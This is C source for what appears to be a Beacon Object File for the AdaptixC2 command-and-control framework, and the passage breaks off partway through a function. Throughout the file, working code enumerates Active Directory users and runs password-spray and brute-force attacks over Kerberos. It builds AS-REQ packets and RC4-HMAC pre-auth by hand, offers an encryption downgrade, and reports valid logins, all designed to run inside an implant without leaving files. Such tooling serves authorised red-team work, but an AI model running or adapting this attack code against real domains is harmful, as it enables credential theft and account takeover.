/*
 * kerbrute.c — AdaptixC2 Beacon Object File
 *
 * In-process Kerberos enumeration and brute-force.
 * No child process spawned, no files dropped on the target.
 *
 * BOF argument layout (ax.bof_pack "cstr,cstr,cstr,cstr,int,int,int"):
 *   [z] list_b64  — base64-encoded file content
 *   [z] domain    — FQDN, e.g. "contoso.local"
 *   [z] dc        — DC hostname or IP ("" = DNS lookup)
 *   [z] single    — mode 1: password | mode 2: username | others: ""
 *   [s] mode      — 0=userenum 1=passwordspray 2=bruteuser 3=bruteforce
 *   [i] delay     — ms between each attempt (0 = no delay)
 *   [s] flags     — bit0=downgrade bit1=safe bit2=verbose
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -masm=intel -Wall -Wno-unused-variable \
 *       -Wno-unused-function -Wno-misleading-indentation -fno-stack-check \
 *       -o kerbrute.x64.o -c kerbrute.c
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "beacon.h"

/* ── Dynamic API imports ─────────────────────────────────────────────────── */
/* WSAStartup/WSACleanup removed — beacon has already initialised Winsock */
WINBASEAPI SOCKET  WINAPI WS2_32$socket(int, int, int);
WINBASEAPI int     WINAPI WS2_32$connect(SOCKET, const struct sockaddr *, int);
WINBASEAPI int     WINAPI WS2_32$send(SOCKET, const char *, int, int);
WINBASEAPI int     WINAPI WS2_32$recv(SOCKET, char *, int, int);
WINBASEAPI int     WINAPI WS2_32$closesocket(SOCKET);
WINBASEAPI int     WINAPI WS2_32$setsockopt(SOCKET, int, int, const char *, int);
WINBASEAPI int     WINAPI WS2_32$getaddrinfo(PCSTR, PCSTR, const ADDRINFOA *, PADDRINFOA *);
WINBASEAPI void    WINAPI WS2_32$freeaddrinfo(PADDRINFOA);

WINBASEAPI LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
WINBASEAPI BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
WINBASEAPI HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
WINBASEAPI PVOID   WINAPI KERNEL32$RtlMoveMemory(PVOID, const void *, SIZE_T);
WINBASEAPI PVOID   WINAPI KERNEL32$RtlZeroMemory(PVOID, SIZE_T);
WINBASEAPI void    WINAPI KERNEL32$GetSystemTime(LPSYSTEMTIME);
WINBASEAPI int     WINAPI KERNEL32$lstrlenA(LPCSTR);
WINBASEAPI BOOL    WINAPI KERNEL32$QueryPerformanceCounter(LARGE_INTEGER *);
WINBASEAPI void    WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);

typedef PVOID BCRYPT_ALG_HANDLE;
typedef PVOID BCRYPT_HASH_HANDLE;
typedef PVOID BCRYPT_KEY_HANDLE;
#ifndef BCRYPT_ALG_HANDLE_HMAC_FLAG
#define BCRYPT_ALG_HANDLE_HMAC_FLAG 0x00000008UL
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptCreateHash(BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptHashData(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptFinishHash(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDestroyHash(BCRYPT_HASH_HANDLE);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptGenerateSymmetricKey(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptEncrypt(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, void *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG *, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDestroyKey(BCRYPT_KEY_HANDLE);

/* ── Macros ───────────────────────────────────────────────────────────────── */
#define Malloc(n)       KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (n))
#define Free(p)         KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (p))
#define Memcpy(d,s,n)   KERNEL32$RtlMoveMemory((d),(s),(n))
#define Memset(d,v,n)   do{BYTE*_p=(BYTE*)(d);SIZE_T _n=(n);while(_n--)*_p++=(BYTE)(v);}while(0)
#define Strlen(s)       KERNEL32$lstrlenA(s)
#define Sleep(ms)       KERNEL32$Sleep(ms)

/*
 * Stack-growth probe stub.
 * The compiler emits a call to __chkstk_ms when a function's stack frame
 * exceeds one page (4 KB).  The beacon loader does not export this symbol,
 * so we provide a no-op stub.  The beacon already runs on a thread with a
 * full stack, so the probe is unnecessary.
 */
void ___chkstk_ms(void) {}  /* three underscores: matches the symbol the compiler emits */

/* Write a two-digit decimal value at p (no NUL) */
static void fmt2(char *p, int v) { p[0]='0'+v/10; p[1]='0'+v%10; }
/* Write a four-digit decimal value at p (no NUL) */
static void fmt4(char *p, int v) {
    p[0]='0'+v/1000; p[1]='0'+v/100%10; p[2]='0'+v/10%10; p[3]='0'+v%10;
}

/* ── Kerberos constants ───────────────────────────────────────────────────── */
#define MAX_RESP                    4096
#define KDC_ERR_C_PRINCIPAL_UNKNOWN    6
#define KDC_ERR_CLIENT_REVOKED        18
#define KDC_ERR_KEY_EXPIRED           23
#define KDC_ERR_PREAUTH_FAILED        24
#define KDC_ERR_PREAUTH_REQUIRED      25
#define APP_AS_REP   0x6b
#define APP_KRB_ERR  0x7e
#define APP_AS_REQ   0x6a

#define MODE_USERENUM      0
#define MODE_SPRAY         1
#define MODE_BRUTEUSER     2
#define MODE_BRUTEFORCE    3

#define FLAG_DOWNGRADE  0x1
#define FLAG_SAFE       0x2
#define FLAG_VERBOSE    0x4

/* ── Shared context (all modes) ──────────────────────────────────────────── */
typedef struct {
    const char *dc;
    const char *domain;
    const char *password;   /* spray: fixed password                    */
    const char *username;   /* bruteuser: fixed target                  */
    int   delay;            /* ms to sleep between attempts             */
    int   downgrade;        /* 1 = advertise RC4 only in etype list     */
    int   safe;             /* 1 = abort immediately on lockout         */
    int   verbose;          /* 1 = log wrong passwords and not-found    */
    /* counters */
    int   valid, notfound, locked, errors;
    /* state flags */
    int   aborted;          /* safe mode tripped a lockout              */
    int   done;             /* bruteuser: stop after first hit/lockout  */
} krb_ctx;

/* ── Base64 decode ────────────────────────────────────────────────────────── */
static int b64val(char c) {
    if (c>='A'&&c<='Z') return c-'A';
    if (c>='a'&&c<='z') return 26+c-'a';
    if (c>='0'&&c<='9') return 52+c-'0';
    if (c=='+') return 62;
    if (c=='/') return 63;
    return -1;
}
static int b64_decode(const char *in, BYTE *out, int max) {
    int n=0, L=Strlen(in);
    for (int i=0; i<L;) {
        int v0=b64val(in[i++]), v1=(i<L?b64val(in[i++]):0);
        int v2=(i<L?b64val(in[i++]):-1), v3=(i<L?b64val(in[i++]):-1);
        if (v0<0) break;
        if (v1<0) v1=0;
        if (n<max) out[n++]=(BYTE)((v0<<2)|(v1>>4));
        if (v2>=0&&n<max) out[n++]=(BYTE)(((v1&0xf)<<4)|(v2>>2));
        if (v3>=0&&n<max) out[n++]=(BYTE)(((v2&0x3)<<6)|v3);
    }
    if (n<max) out[n]=0;
    return n;
}

/* ── MD4 (RFC 1320) — NT hash only ──────────────────────────────────────── */
#define ROL32(v,n) (((v)<<(n))|((UINT32)(v)>>(32-(n))))
#define MD4F(x,y,z) (((x)&(y))|(~(x)&(z)))
#define MD4G(x,y,z) (((x)&(y))|((x)&(z))|((y)&(z)))
#define MD4H(x,y,z) ((x)^(y)^(z))
#define R1(a,b,c,d,x,s) a=ROL32(a+MD4F(b,c,d)+x,s)
#define R2(a,b,c,d,x,s) a=ROL32(a+MD4G(b,c,d)+x+0x5A827999u,s)
#define R3(a,b,c,d,x,s) a=ROL32(a+MD4H(b,c,d)+x+0x6ED9EBA1u,s)

static void md4_compress(UINT32 *s, const BYTE *blk) {
    UINT32 x[16], a=s[0], b=s[1], c=s[2], d=s[3];
    for (int i=0;i<16;i++)
        x[i]=(UINT32)blk[i*4]|((UINT32)blk[i*4+1]<<8)|((UINT32)blk[i*4+2]<<16)|((UINT32)blk[i*4+3]<<24);
    R1(a,b,c,d,x[0],3);  R1(d,a,b,c,x[1],7);  R1(c,d,a,b,x[2],11); R1(b,c,d,a,x[3],19);
    R1(a,b,c,d,x[4],3);  R1(d,a,b,c,x[5],7);  R1(c,d,a,b,x[6],11); R1(b,c,d,a,x[7],19);
    R1(a,b,c,d,x[8],3);  R1(d,a,b,c,x[9],7);  R1(c,d,a,b,x[10],11);R1(b,c,d,a,x[11],19);
    R1(a,b,c,d,x[12],3); R1(d,a,b,c,x[13],7); R1(c,d,a,b,x[14],11);R1(b,c,d,a,x[15],19);
    R2(a,b,c,d,x[0],3);  R2(d,a,b,c,x[4],5);  R2(c,d,a,b,x[8],9);  R2(b,c,d,a,x[12],13);
    R2(a,b,c,d,x[1],3);  R2(d,a,b,c,x[5],5);  R2(c,d,a,b,x[9],9);  R2(b,c,d,a,x[13],13);
    R2(a,b,c,d,x[2],3);  R2(d,a,b,c,x[6],5);  R2(c,d,a,b,x[10],9); R2(b,c,d,a,x[14],13);
    R2(a,b,c,d,x[3],3);  R2(d,a,b,c,x[7],5);  R2(c,d,a,b,x[11],9); R2(b,c,d,a,x[15],13);
    R3(a,b,c,d,x[0],3);  R3(d,a,b,c,x[8],9);  R3(c,d,a,b,x[4],11); R3(b,c,d,a,x[12],15);
    R3(a,b,c,d,x[2],3);  R3(d,a,b,c,x[10],9); R3(c,d,a,b,x[6],11); R3(b,c,d,a,x[14],15);
    R3(a,b,c,d,x[1],3);  R3(d,a,b,c,x[9],9);  R3(c,d,a,b,x[5],11); R3(b,c,d,a,x[13],15);
    R3(a,b,c,d,x[3],3);  R3(d,a,b,c,x[11],9); R3(c,d,a,b,x[7],11); R3(b,c,d,a,x[15],15);
    s[0]+=a; s[1]+=b; s[2]+=c; s[3]+=d;
}
static void md4(const BYTE *msg, int len, BYTE *out) {
    UINT32 s[4]={0x67452301u,0xEFCDAB89u,0x98BADCFEu,0x10325476u};
    int blocks=len/64;
    for (int i=0;i<blocks;i++) md4_compress(s, msg+i*64);
    BYTE pad[128]; Memset(pad,0,128);
    int rem=len%64; Memcpy(pad, msg+blocks*64, rem); pad[rem]=0x80;
    UINT64 bits=(UINT64)len*8;
    if (rem<56) { Memcpy(pad+56,&bits,8); md4_compress(s,pad); }
    else         { Memcpy(pad+120,&bits,8); md4_compress(s,pad); md4_compress(s,pad+64); }
    for (int i=0;i<4;i++) {
        out[i*4+0]=(BYTE)s[i];       out[i*4+1]=(BYTE)(s[i]>>8);
        out[i*4+2]=(BYTE)(s[i]>>16); out[i*4+3]=(BYTE)(s[i]>>24);
    }
}
static void nt_hash(const char *pw, BYTE *out) {
    int len=Strlen(pw);
    BYTE *u16=(BYTE*)Malloc((len+1)*2);
    for (int i=0;i<len;i++) { u16[i*2]=(BYTE)pw[i]; u16[i*2+1]=0; }
    md4(u16, len*2, out);
    Free(u16);
}

/* ── HMAC-MD5 (BCrypt) ────────────────────────────────────────────────────── */
static int hmac_md5(const BYTE *key, int kl, const BYTE *data, int dl, BYTE *out) {
    BCRYPT_ALG_HANDLE hA=NULL; BCRYPT_HASH_HANDLE hH=NULL;
    if (!NT_SUCCESS(BCRYPT$BCryptOpenAlgorithmProvider(&hA,L"MD5",NULL,BCRYPT_ALG_HANDLE_HMAC_FLAG))) return 0;
    if (!NT_SUCCESS(BCRYPT$BCryptCreateHash(hA,&hH,NULL,0,(PUCHAR)key,(ULONG)kl,0))) {
        BCRYPT$BCryptCloseAlgorithmProvider(hA,0); return 0; }
    BCRYPT$BCryptHashData(hH,(PUCHAR)data,(ULONG)dl,0);
    BCRYPT$BCryptFinishHash(hH,out,16,0);
    BCRYPT$BCryptDestroyHash(hH);
    BCRYPT$BCryptCloseAlgorithmProvider(hA,0);
    return 1;
}

/* ── RC4 (BCrypt, in-place) ───────────────────────────────────────────────── */
static int rc4(const BYTE *key, int kl, BYTE *data, int dl) {
    BCRYPT_ALG_HANDLE hA=NULL; BCRYPT_KEY_HANDLE hK=NULL; ULONG res=0;
    if (!NT_SUCCESS(BCRYPT$BCryptOpenAlgorithmProvider(&hA,L"RC4",NULL,0))) return 0;
    if (!NT_SUCCESS(BCRYPT$BCryptGenerateSymmetricKey(hA,&hK,NULL,0,(PUCHAR)key,(ULONG)kl,0))) {
        BCRYPT$BCryptCloseAlgorithmProvider(hA,0); return 0; }
    BCRYPT$BCryptEncrypt(hK,data,(ULONG)dl,NULL,NULL,0,data,(ULONG)dl,&res,0);
    BCRYPT$BCryptDestroyKey(hK);
    BCRYPT$BCryptCloseAlgorithmProvider(hA,0);
    return 1;
}

/* RC4-HMAC Kerberos encrypt (RFC 4757) — key_usage=1 for PA-ENC-TIMESTAMP */
static int rc4hmac_encrypt(const BYTE *nthash, int usage,
                            const BYTE *pt, int ptlen, BYTE *out, int outmax) {
    if (outmax < 16+8+ptlen) return -1;
    BYTE T[4]={(BYTE)usage,0,0,0}, K1[16];
    if (!hmac_md5(nthash,16,T,4,K1)) return -1;
    LARGE_INTEGER q; KERNEL32$QueryPerformanceCounter(&q);
    BYTE conf[8];
    for (int i=0;i<8;i++) conf[i]=(BYTE)(q.QuadPart>>(i*7))^(BYTE)(0x5c^i);
    int bplen=8+ptlen; BYTE *bp=(BYTE*)Malloc(bplen);
    Memcpy(bp,conf,8); Memcpy(bp+8,pt,ptlen);
    BYTE ck[16], K3[16];
    if (!hmac_md5(K1,16,bp,bplen,ck)) { Free(bp); return -1; }
    if (!hmac_md5(K1,16,ck,16,K3))    { Free(bp); return -1; }
    if (!rc4(K3,16,bp,bplen))         { Free(bp); return -1; }
    Memcpy(out,ck,16); Memcpy(out+16,bp,bplen);
    Free(bp);
    return 16+bplen;
}

/* ── DER helpers ─────────────────────────────────────────────────────────── */
static int dwlen(BYTE *p, int len) {
    if (len<0x80)  { p[0]=(BYTE)len; return 1; }
    if (len<=0xFF) { p[0]=0x81; p[1]=(BYTE)len; return 2; }
    p[0]=0x82; p[1]=(BYTE)(len>>8); p[2]=(BYTE)len; return 3;
}
static int dtlv(BYTE *p, BYTE tag, const BYTE *val, int vlen) {
    int off=0; p[off++]=tag; off+=dwlen(p+off,vlen);
    if (val&&vlen>0) Memcpy(p+off,val,vlen);
    return off+vlen;
}

/* ── PA-ENC-TS-ENC plaintext ─────────────────────────────────────────────── */
static int build_pa_enc_ts(BYTE *buf) {
    SYSTEMTIME st; KERNEL32$GetSystemTime(&st);
    char ts[16];
    /* YYYYMMDDHHmmssZ (15 chars) — hand-formatted, no sprintf needed */
    fmt4(ts,    st.wYear);
    fmt2(ts+4,  (int)st.wMonth);
    fmt2(ts+6,  (int)st.wDay);
    fmt2(ts+8,  (int)st.wHour);
    fmt2(ts+10, (int)st.wMinute);
    fmt2(ts+12, (int)st.wSecond);
    ts[14]='Z'; ts[15]=0;
    int tl=15;
    BYTE gt[20]; int gl=dtlv(gt,0x18,(BYTE*)ts,tl);
    BYTE gc[25]; int gcl=dtlv(gc,0xa0,gt,gl);
    return dtlv(buf,0x30,gc,gcl);
}

/* ── Build SEQUENCE OF PA-DATA (encrypted timestamp) ─────────────────────── */
static int build_padata(BYTE *buf, int bsz, const BYTE *nthash) {
    BYTE pts[48]; int ptslen=build_pa_enc_ts(pts);
    BYTE cipher[128]; int clen=rc4hmac_encrypt(nthash,1,pts,ptslen,cipher,sizeof(cipher));
    if (clen<0) return -1;
    BYTE etv[]={0x02,0x01,0x17};
    BYTE etc[8]; int etl=dtlv(etc,0xa0,etv,sizeof(etv));
    BYTE cos[150]; int col=dtlv(cos,0x04,cipher,clen);
    BYTE coc[160]; int ccl=dtlv(coc,0xa2,cos,col);
    BYTE edin[180]; int edi=0;
    Memcpy(edin,etc,etl); edi+=etl;
    Memcpy(edin+edi,coc,ccl); edi+=ccl;
    BYTE eds[190]; int esl=dtlv(eds,0x30,edin,edi);
    BYTE ptv[]={0x02,0x01,0x02};
    BYTE ptc[8]; int ptl=dtlv(ptc,0xa1,ptv,sizeof(ptv));
    BYTE pvos[210]; int pvl=dtlv(pvos,0x04,eds,esl);
    BYTE pvoc[220]; int pcl=dtlv(pvoc,0xa2,pvos,pvl);
    BYTE pdin[250]; int pdi=0;
    Memcpy(pdin,ptc,ptl); pdi+=ptl;
    Memcpy(pdin+pdi,pvoc,pcl); pdi+=pcl;
    BYTE pds[260]; int psl=dtlv(pds,0x30,pdin,pdi);
    int total=dtlv(buf,0x30,pds,psl);
    return total<=bsz ? total : -1;
}

/* ── Build AS-REQ ─────────────────────────────────────────────────────────── */
/*
 * downgrade=1 → advertise only etype 23 (RC4-HMAC) in the etype list.
 * downgrade=0 → advertise AES256 + AES128 + RC4 (standard).
 */
static int build_as_req(BYTE *buf, int bsz,
                         const char *username, const char *domain_in,
                         const BYTE *padata, int padatalen,
                         int downgrade)
{
    int domlen=Strlen(domain_in);
    BYTE realm[128]; Memset(realm,0,128);
    for (int i=0;i<domlen&&i<127;i++) {
        char c=domain_in[i]; realm[i]=(BYTE)((c>='a'&&c<='z')?c-0x20:c); }
    int ul=Strlen(username), rl=Strlen((char*)realm);

    BYTE opts[]={0x03,0x05,0x00,0x40,0x81,0x00,0x10};

    /* etype list — downgrade uses only RC4 */
    BYTE etin_full[] = {0x02,0x01,0x12, 0x02,0x01,0x11, 0x02,0x01,0x17};
    BYTE etin_rc4[]  = {0x02,0x01,0x17};
    BYTE *etin   = downgrade ? etin_rc4 : etin_full;
    int   einlen = downgrade ? (int)sizeof(etin_rc4) : (int)sizeof(etin_full);
    BYTE ets[16]; int etsl=dtlv(ets,0x30,etin,einlen);
    BYTE etc[20]; int etcl=dtlv(etc,0xa8,ets,etsl);

    LARGE_INTEGER q; KERNEL32$QueryPerformanceCounter(&q);
    BYTE nc[]={0x02,0x04,(BYTE)(q.LowPart>>24),(BYTE)(q.LowPart>>16),(BYTE)(q.LowPart>>8),(BYTE)q.LowPart};
    BYTE ncc[12]; int nccl=dtlv(ncc,0xa7,nc,sizeof(nc));

    BYTE tillv[]={0x18,0x0f,'9','9','9','9','1','2','3','1','2','3','5','9','5','9','Z'};
    BYTE tillc[24]; int tlcl=dtlv(tillc,0xa5,tillv,sizeof(tillv));

    /* sname: krbtgt/REALM */
    BYTE snt[]={0x02,0x01,0x02}; BYTE sntc[8]; int snnl=dtlv(sntc,0xa0,snt,sizeof(snt));
    BYTE sns[300]; int snso=0;
    snso+=dtlv(sns+snso,0x1b,(BYTE*)"krbtgt",6);
    snso+=dtlv(sns+snso,0x1b,realm,rl);
    BYTE snss[310]; int snnss=dtlv(snss,0x30,sns,snso);
    BYTE snsc[320]; int snnsc=dtlv(snsc,0xa1,snss,snnss);
    BYTE snin[400]; int sni=0;
    Memcpy(snin,sntc,snnl); sni+=snnl;
    Memcpy(snin+sni,snsc,snnsc); sni+=snnsc;
    BYTE snseq[410]; int snsl=dtlv(snseq,0x30,snin,sni);
    BYTE snctx[420]; int sncl=dtlv(snctx,0xa3,snseq,snsl);

    /* realm [2] */
    BYTE rgs[150]; int rgsl=dtlv(rgs,0x1b,realm,rl);
    BYTE rgc[160]; int rgcl=dtlv(rgc,0xa2,rgs,rgsl);

    /* cname [1]: NT-PRINCIPAL */
    BYTE cnt[]={0x02,0x01,0x01}; BYTE cntc[8]; int cnnl=dtlv(cntc,0xa0,cnt,sizeof(cnt));
    BYTE cns[300]; int cnso=dtlv(cns,0x1b,(BYTE*)username,ul);
    BYTE cnss[310]; int cnnss=dtlv(cnss,0x30,cns,cnso);
    BYTE cnsc[320]; int cnnsc=dtlv(cnsc,0xa1,cnss,cnnss);
    BYTE cnin[400]; int cni=0;
    Memcpy(cnin,cntc,cnnl); cni+=cnnl;
    Memcpy(cnin+cni,cnsc,cnnsc); cni+=cnnsc;
    BYTE cnseq[410]; int cnsl=dtlv(cnseq,0x30,cnin,cni);
    BYTE cnctx[420]; int cncl=dtlv(cnctx,0xa1,cnseq,cnsl);

    BYTE opc[16]; int opcl=dtlv(opc,0xa0,opts,sizeof(opts));

    BYTE body[1500]; int bi=0;
    Memcpy(body+bi,opc,opcl);    bi+=opcl;
    Memcpy(body+bi,cnctx,cncl);  bi+=cncl;
    Memcpy(body+bi,rgc,rgcl);    bi+=rgcl;
    Memcpy(body+bi,snctx,sncl);  bi+=sncl;
    Memcpy(body+bi,tillc,tlcl);  bi+=tlcl;
    Memcpy(body+bi,ncc,nccl);    bi+=nccl;
    Memcpy(body+bi,etc,etcl);    bi+=etcl;
    BYTE bseq[1520]; int bsl=dtlv(bseq,0x30,body,bi);
    BYTE bctx[1530]; int bcl=dtlv(bctx,0xa4,bseq,bsl);

    BYTE kreq[2048]; int ki=0;
    BYTE pvno[]={0x02,0x01,0x05}; ki+=dtlv(kreq+ki,0xa1,pvno,sizeof(pvno));
    BYTE msgt[]={0x02,0x01,0x0a}; ki+=dtlv(kreq+ki,0xa2,msgt,sizeof(msgt));
    if (padata&&padatalen>0) {
        BYTE pdc[600]; int pdcl=dtlv(pdc,0xa3,padata,padatalen);
        Memcpy(kreq+ki,pdc,pdcl); ki+=pdcl; }
    Memcpy(kreq+ki,bctx,bcl); ki+=bcl;
    BYTE kseq[2060]; int ksl=dtlv(kseq,0x30,kreq,ki);
    int total=dtlv(buf,APP_AS_REQ,kseq,ksl);
    return total>bsz ? -1 : total;
}

/* ── Parse KRB-ERROR → error-code, or -1 ─────────────────────────────────── */
static int parse_krb_error(const BYTE *r, int len) {
    if (len<4||r[0]!=APP_KRB_ERR) return -1;
    int pos=1;
    if (r[pos]&0x80) pos+=(r[pos]&0x7f)+1; else pos++;
    if (pos>=len||r[pos]!=0x30) return -1; pos++;
    if (r[pos]&0x80) pos+=(r[pos]&0x7f)+1; else pos++;
    while (pos+2<len) {
        BYTE tag=r[pos++]; int clen;
        if (r[pos]&0x80) {
            int lb=r[pos]&0x7f; clen=0; pos++;
            for (int i=0;i<lb&&pos<len;i++) clen=(clen<<8)|r[pos++];
        } else { clen=r[pos++]; }
        if (tag==0xa6&&clen>=3&&pos+2<len&&r[pos]==0x02) {
            int il=r[pos+1];
            if (il==1) return r[pos+2];
            if (il==2&&pos+3<len) return (r[pos+2]<<8)|r[pos+3]; }
        pos+=clen;
    }
    return -1;
}

/*
 * Parse dotted-decimal IPv4 string into network-byte-order u_long.
 * Returns 0xFFFFFFFF on failure (same as inet_addr on error).
 * No Winsock calls — pure C arithmetic.
 */
static u_long ipv4_parse(const char *s) {
    u_long a=0,b=0,cc=0,d=0;
    const char *p=s;
    while (*p>='0'&&*p<='9'){a=a*10+(*p-'0');p++;} if (*p++!='.') return 0xFFFFFFFF;
    while (*p>='0'&&*p<='9'){b=b*10+(*p-'0');p++;} if (*p++!='.') return 0xFFFFFFFF;
    while (*p>='0'&&*p<='9'){cc=cc*10+(*p-'0');p++;} if (*p++!='.') return 0xFFFFFFFF;
    while (*p>='0'&&*p<='9'){d=d*10+(*p-'0');p++;}
    if (*p || a>255||b>255||cc>255||d>255) return 0xFFFFFFFF;
    /* Store octets in memory order [a,b,c,d] = network byte order.
     * On little-endian x86/x64: u_long = a | b<<8 | c<<16 | d<<24       */
    return (u_long)(a | (b<<8) | (cc<<16) | (d<<24));
}

/* Port 88 in network byte order — computed at compile time, no htons() call */
#define KRB_PORT_NBO  ((u_short)0x5800)   /* htons(88): 0x0058 → 0x5800 */

/*
 * TCP send/recv to KDC:88.
 * Does NOT call WSAStartup/WSACleanup — relies on the beacon having already
 * initialised Winsock for its own C2 communications (standard BOF practice).
 *
 * IP strings ("10.0.0.100") are parsed with ipv4_parse() — no Winsock call.
 * Hostnames fall back to getaddrinfo.
 *
 * Return values:
 *   -1  could not resolve DC (bad IP string and getaddrinfo also failed)
 *   -2  socket() failed
 *   -3  connect() failed — DC port 88 unreachable
 *   -4  recv() of length prefix failed / KDC silent
 *   -5  response length out of range
 *   -6  recv() of response body failed
 *  >=0  bytes received (success)
 */
static int krb_transact(const char *dc, const BYTE *req, int rlen, BYTE *resp, int max) {
    struct sockaddr_in addr;
    Memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = KRB_PORT_NBO;

    u_long ip = ipv4_parse(dc);

    if (ip != 0xFFFFFFFF) {
        addr.sin_addr.s_addr = ip;
    } else {
        ADDRINFOA hints, *res = NULL;
        Memset(&hints, 0, sizeof(hints));
        hints.ai_family   = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        if (WS2_32$getaddrinfo(dc, "88", &hints, &res) != 0) return -1;
        addr = *(struct sockaddr_in *)res->ai_addr;
        addr.sin_port = KRB_PORT_NBO;
        WS2_32$freeaddrinfo(res);
    }

    SOCKET s = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return -2;

    DWORD tv = 5000;
    WS2_32$setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(tv));
    WS2_32$setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&tv, sizeof(tv));

    int conn = WS2_32$connect(s, (struct sockaddr*)&addr, sizeof(addr));
    if (conn != 0) { WS2_32$closesocket(s); return -3; }

    BYTE lp[4]={(BYTE)(rlen>>24),(BYTE)(rlen>>16),(BYTE)(rlen>>8),(BYTE)rlen};
    WS2_32$send(s,(char*)lp,4,0);
    WS2_32$send(s,(char*)req,rlen,0);

    BYTE rl[4]={0}; int got=0;
    while (got<4) {
        int r=WS2_32$recv(s,(char*)rl+got,4-got,0);
        got+=r;
    }

    int resplen=((int)rl[0]<<24)|((int)rl[1]<<16)|((int)rl[2]<<8)|(int)rl[3];
    if (resplen<=0||resplen>max) { WS2_32$closesocket(s); return -5; }

    got=0;
    while (got<resplen) {
        int r=WS2_32$recv(s,(char*)resp+got,resplen-got,0);
        if (r<=0) { WS2_32$closesocket(s); return -6; }
        got+=r;
    }
    WS2_32$closesocket(s);
    return got;
}

/* ── Trim CR/LF/spaces ───────────────────────────────────────────────────── */
static char *trim(char *s) {
    while (*s==' '||*s=='\t'||*s=='\r') s++;
    int n=Strlen(s);
    while (n>0&&(s[n-1]=='\r'||s[n-1]==' '||s[n-1]=='\t')) n--;
    s[n]=0;
    return s;
}

/*
 * Core test: send AS-REQ and classify the KDC response.
 *
 * nthash: pre-computed NT hash (NULL = no pre-auth, userenum mode)
 *
 * Returns:
 *   1  valid (user exists / correct creds)
 *   0  not found (KDC_ERR_C_PRINCIPAL_UNKNOWN)
 *   2  locked / disabled (KDC_ERR_CLIENT_REVOKED)
 *   3  wrong password — user exists (KDC_ERR_PREAUTH_FAILED / REQUIRED)
 *  -1  network or build error
 */
static int test_user(krb_ctx *ctx, const char *username, const BYTE *nthash) {
    BYTE req[2048], resp[MAX_RESP], padata[512];
    int req_len;

    if (nthash) {
        int pdl=build_padata(padata,sizeof(padata),nthash);
        if (pdl<0) return -1;
        req_len=build_as_req(req,sizeof(req),username,ctx->domain,padata,pdl,ctx->downgrade);
    } else {
        req_len=build_as_req(req,sizeof(req),username,ctx->domain,NULL,0,ctx->downgrade);
    }
    if (req_len<0) return -1;

    int rlen=krb_transact(ctx->dc,req,req_len,resp,MAX_RESP);
    if (rlen<=0) return -1;

    /* AS-REP: valid credentials (or no pre-auth for userenum) */
    if (resp[0]==APP_AS_REP) return 1;

    int err=parse_krb_error(resp,rlen);
    switch (err) {
    case KDC_ERR_PREAUTH_REQUIRED:  return nthash ? 3 : 1;
    case KDC_ERR_PREAUTH_FAILED:    return 3;
    case KDC_ERR_C_PRINCIPAL_UNKNOWN: return 0;
    case KDC_ERR_CLIENT_REVOKED:    return 2;
    case KDC_ERR_KEY_EXPIRED:       return 1;
    /* KDC_ERR_POLICY (12) — policy restriction but user exists */
    case 12: return 1;
    /* KDC_ERR_ETYPE_NOSUPP (14) — DC rejected RC4, creds may be valid */
    case 14:
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] ETYPE_NOSUPP for %s@%s — RC4 rejected, try --downgrade\n",
            username, ctx->domain);
        return 1;
    /* KDC_ERR_MUST_USE_USER2USER (37) — service ticket constraint */
    case 37: return 1;
    default:
        /* Print the raw code so the operator can investigate */
        BeaconPrintf(CALLBACK_OUTPUT,
            "[?] Unknown KRB error %d: %s@%s\n", err, username, ctx->domain);
        return -7;
    }
}

/* ── Per-attempt post-processing (delay, verbose, safe) ──────────────────── */
/*
 * Call after every test_user() to apply shared flags.
 * Returns 1 if caller should stop iterating (safe mode lockout or done).
 */
static int handle_result(krb_ctx *ctx, int result,
                          const char *username, const char *password,
                          int is_userenum)
{
    switch (result) {
    case 1:
        if (is_userenum) {
            BeaconPrintf(CALLBACK_OUTPUT,"[+] VALID USER: %s@%s\n", username, ctx->domain);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,"[+] VALID LOGIN: %s@%s : %s\n",
                         username, ctx->domain, password ? password : "");
        }
        ctx->valid++;
        break;
    case 0:
        ctx->notfound++;
        if (ctx->verbose)
            BeaconPrintf(CALLBACK_OUTPUT,"[-] NOT FOUND: %s@%s\n", username, ctx->domain);
        break;
    case 2:
